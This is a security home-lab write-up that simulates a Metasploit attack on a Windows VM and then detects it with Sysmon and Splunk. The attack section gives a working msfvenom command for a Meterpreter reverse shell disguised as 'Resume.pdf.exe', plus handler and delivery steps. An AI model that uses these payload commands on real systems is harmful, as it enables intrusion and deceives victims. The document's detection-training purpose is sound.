# SOC Home Lab: Detecting a Simulated Metasploit Attack with Sysmon & Splunk

## Planning

### Goal

Build a basic SOC home lab to practice:

- Windows Event Logs
- Metasploit
- Sysmon
- Splunk
- Attack detection

### Software

- VirtualBox
- Kali Linux
- Windows 10 with:
    - Sysmon
    - Splunk Enterprise

|Machine|IP|
|---|---|
|Kali|192.168.56.107|
|Windows|192.168.56.108|

---

## Process

### Attack Phase

**1. Scanning the victim for open ports with Nmap**

![Nmap scan results](https://claude.ai/chat/images/nmap-scan.png)

Port 3389 is open, which is RDP.

**2. Using msfvenom to create a reverse shell (Meterpreter) payload**

First, search for available payloads:

![Searching for available payloads](https://claude.ai/chat/images/msfvenom-payload-search.png)

This helps narrow down the right one:

![Payload selection](https://claude.ai/chat/images/msfvenom-payload-select.png)

**3. Building the malware**

```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.107 LPORT=4444 -f exe -o Resume.pdf.exe
```

This command generates the malware using the **meterpreter/reverse_tcp** payload, which is instructed to connect back to our machine based on `LHOST` (the attacker's IP) and `LPORT` (the listening port).

The file format is `.exe` as specified, and the file is named `Resume.pdf.exe`.

![Generated malware file](https://claude.ai/chat/images/msfvenom-output.png)

**4. Starting a listener/handler in Metasploit**

To catch the connection, open Metasploit and use the handler module:

```bash
msf > use exploit/multi/handler
```

![Metasploit handler setup](https://claude.ai/chat/images/metasploit-handler.png)

Configure the following options:

1. Payload → `windows/x64/meterpreter/reverse_tcp`
2. `LHOST` → attacker's IP
3. `LPORT` → listening port

![Handler configuration](https://claude.ai/chat/images/metasploit-handler-config.png)

**5. Launching the exploit**

With the handler configured and running, start the listener with `exploit`.

![Handler listening for connection](https://claude.ai/chat/images/metasploit-exploit.png)

**6. Serving the payload**

Start an HTTP server using Python on the attack machine so the target machine can download the malware:

```bash
python3 -m http.server 9999
```

![Python HTTP server](https://claude.ai/chat/images/python-http-server.png)

**7. Delivering the payload**

Switch to the Windows VM, disable Windows Defender, and open a web browser to download and execute the malware.

**8. Executing the payload**

Download the malware and execute the file:

![Downloading the malware](https://claude.ai/chat/images/download-malware.png)

To an unaware user, the file appears to be a normal PDF:

![File disguised as a PDF](https://claude.ai/chat/images/fake-pdf-icon.png)

This is why enabling file name extensions is important — it would reveal the real `.exe` extension.

**9. Bypassing the SmartScreen warning**

The user clicks "Run anyway":

![SmartScreen warning bypass](https://claude.ai/chat/images/run-anyway.png)

**10. Verifying the connection**

Confirm the connection is established between the target machine and the attacker machine. Run the following in PowerShell and search the output for the malicious process:

```powershell
netstat -anob
```

![Netstat output showing established connection](https://claude.ai/chat/images/netstat-output.png)

The PID is `8112`, so we can look up this PID in Task Manager:

![Task Manager showing PID 8112](https://claude.ai/chat/images/task-manager-pid.png)

**11. Confirming the shell on the attacker machine**

![Meterpreter shell established](https://claude.ai/chat/images/meterpreter-shell.png)

We now have an open shell on the target machine.

---

## Detection & Analysis

After executing the payload on the Windows VM, Sysmon generated multiple telemetry events that allowed the attack to be reconstructed.

### Process Creation

The investigation began by reviewing **Sysmon Event ID 1 (Process Creation)**. This indicates that the user manually launched the executable by double-clicking it from Windows Explorer.

![Sysmon Event ID 1 - process creation](https://claude.ai/chat/images/sysmon-event1-process-creation.png)

### Network Activity

Next, outbound network connections were investigated.

![Outbound network connection overview](https://claude.ai/chat/images/network-activity-overview.png)

Using **Sysmon Event ID 3 (Network Connection)**, it was identified that `Resume.pdf.exe` established an outbound TCP connection.

### RDP Connection Attempts

To confirm the RDP exposure identified earlier during the Nmap scan, a search was run to check for connection attempts on port 3389:

```spl
index="endpoint" dest_port=3389 192.168.56.107 | table _time SourceIp dest_port | sort -_time
```

![Splunk search showing repeated RDP connection attempts on port 3389](https://claude.ai/chat/images/splunk-rdp-connections.png)

The search confirming multiple connection attempts to the exposed RDP service, all originating from the attacker machine (`192.168.56.107`).

### Correlating Process and Network Events

To verify that the network activity originated from the executed payload, **Sysmon Event ID 1 (Process Creation)** was correlated with **Event ID 3 (Network Connection)** using the **ProcessGuid**.

Both events shared the same **ProcessGuid**, confirming that the network connection was initiated by the same instance of `Resume.pdf.exe`.

![ProcessGuid correlation between Event ID 1 and Event ID 3](https://claude.ai/chat/images/processguid-correlation.png)

### Process Relationship Analysis

Additional process creation events were investigated. A new `cmd.exe` process was spawned, followed by the execution of several Windows command-line utilities.

![cmd.exe process creation](https://claude.ai/chat/images/cmd-process-creation.png)

Initially, the `ParentImage` field for `cmd.exe` was not populated in the Splunk environment. To identify the parent process of `cmd.exe`, the process whose `ProcessId` matched the `ParentProcessId` recorded in the Sysmon event was located. This correlation confirmed that `Resume.pdf.exe` was the parent process, and that the command interpreter was spawned directly by the executed payload.

![ParentProcessId correlation confirming Resume.pdf.exe as parent](https://claude.ai/chat/images/parentprocessid-correlation.png)

This allowed the process tree to be reconstructed even without the `ParentImage` field.

### Process Tree Reconstruction

Using Sysmon telemetry collected in Splunk, the following execution chain was reconstructed:

```text
explorer.exe
        │
        ▼
Resume.pdf.exe (PID 8112)
        │
        ├──────────────► Outbound TCP Connection
        │                                  192.168.56.107:4444
        │
        ▼
cmd.exe (PID 1972)
        │
        ├── whoami.exe
        ├── ipconfig.exe
        └── net.exe
```

This process tree demonstrates that the executable not only established external communication but also launched an interactive command interpreter used to execute reconnaissance commands on the endpoint.

### Findings

1. The user executed `Resume.pdf.exe`.
2. Sysmon recorded the process creation (Event ID 1).
3. The process established an outbound TCP connection to `192.168.56.107` on TCP port `4444`.
4. A command interpreter (`cmd.exe`) was launched.
5. The shell executed multiple Windows utilities, including:
    - `whoami`
    - `ipconfig`
    - `net`
6. Correlation using **ProcessGuid** and **ParentProcessId** confirmed that all observed activity originated from the same executable.

---

## Conclusion

This lab demonstrates how a SOC analyst can reconstruct an attack using **Sysmon telemetry** and **Splunk correlation** without relying on knowledge of the attacker's tools.

By correlating **Event ID 1 (Process Creation)** with **Event ID 3 (Network Connection)** using the **ProcessGuid**, and linking child processes through **ParentProcessId**, it was possible to reconstruct the execution tree from the initial user action to the recon command execution.
